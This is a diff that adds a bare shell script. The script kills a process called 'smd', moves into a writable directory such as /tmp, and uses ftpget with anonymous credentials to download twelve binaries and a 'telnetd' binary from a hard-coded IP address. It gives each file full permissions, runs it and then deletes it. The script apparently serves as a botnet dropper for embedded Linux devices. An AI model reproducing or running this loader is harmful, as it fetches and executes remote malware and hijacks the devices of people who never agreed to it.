@@ -1,0 +1,15 @@
+#!/bin/sh
+killall -9 smd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 sc1 sc1; chmod 777 sc1 ./sc1; rm -rf sc1
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 sc2 sc2; chmod 777 sc2 ./sc2; rm -rf sc2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 sc3 sc3; chmod 777 sc3 ./sc3; rm -rf sc3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 sc4 sc4; chmod 777 sc4 ./sc4; rm -rf sc4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 sc5 sc5; chmod 777 sc5 ./sc5; rm -rf sc5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 sc6 sc6; chmod 777 sc6 ./sc6; rm -rf sc6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 sc7 sc7; chmod 777 sc7 ./sc7; rm -rf sc7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 sc8 sc8; chmod 777 sc8 ./sc8; rm -rf sc8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 sc9 sc9; chmod 777 sc9 ./sc9; rm -rf sc9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 sc10 sc10; chmod 777 sc10 ./sc10; rm -rf sc10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 sc11 sc11; chmod 777 sc11 ./sc11; rm -rf sc11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 sc12 sc12; chmod 777 sc12 ./sc12; rm -rf sc12
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 telnetd telnetd; chmod 777 telnetd ./telnetd; rm -rf telnetd
